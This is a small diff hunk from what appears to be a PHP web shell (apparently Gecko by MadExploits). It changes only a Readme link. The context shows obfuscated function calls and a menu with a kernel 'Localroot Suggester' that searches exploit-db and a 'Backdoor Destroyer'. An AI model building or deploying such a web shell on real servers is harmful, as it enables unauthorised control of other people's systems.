@@ -544,7 +544,7 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=folder" class=""><i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder</a></li>
                     <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= linux_version(); ?>" class=""><i class="fa-solid fa-bug"></i>&nbsp;Localroot Suggester</a></li>
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&backdoor=true" class=""><i class="fa-solid fa-virus"></i>&nbsp;Backdoor Destroyer</a></li>
-                    <li><a href="https://github.com/MadExploits" class=""><i class="fa-solid fa-book"></i>&nbsp;Readme</a></li>
+                    <li><a href="https://github.com/MadExploits/Gecko/" class=""><i class="fa-solid fa-book"></i>&nbsp;Readme</a></li>
                 </ul>
             </div>
         </div>
